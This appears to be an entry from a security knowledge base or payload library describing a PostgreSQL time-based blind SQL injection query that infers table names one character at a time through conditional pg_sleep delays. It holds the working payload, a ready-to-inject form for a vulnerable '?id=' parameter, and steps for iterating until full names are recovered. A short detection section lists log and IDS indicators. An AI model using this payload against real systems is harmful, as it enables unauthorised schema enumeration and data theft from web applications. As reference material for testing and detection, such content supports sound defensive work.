---
id: ddf208d0-d8d9-49d8-9a88-3d59d21b19e7
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:35.879614+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - postgresql
  - sql-injection
  - time-based
  - blind-sqli
  - table-enumeration
platforms:
  - Database
validated: true
---

# PostgreSQL-Time-Based-Table-Name-Character-Check

## Code

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

## Description

This SQL code performs a time-based check to infer the first character of a table name from the information_schema.tables view in PostgreSQL. It uses a CASE statement with substring extraction and conditional pg_sleep: a 5-second delay occurs if the character matches 'a', allowing blind inference without error messages or direct output.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| position | Starting position in the table_name string (1-based index). | 1 (for first character), 2 (for second) |
| char | Single character to test against (iterate over a-z, 0-9, _, etc.). | 'a', 'b', '1' |
| sleep_delay | Duration of sleep for true condition (in seconds). | 5 |

## Usage

Inject into a vulnerable web parameter, e.g., '?id=1' AND (select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1)--'. Send requests for each possible character and position. A delayed response confirms a match. Use in procedures for schema enumeration, iterating until the full table name is reconstructed.

## Detection

- Logs of pg_sleep calls longer than normal query times.
- Repeated similar queries varying only in character conditions, detectable via query pattern analysis.
- Increased response times from database queries accessing information_schema.
- IDS signatures for substring and pg_sleep combinations in SQL traffic.

## Related

- [[procedures/PostgreSQL-Time-Based-Blind-SQL-Injection-for-Table-Dump]]
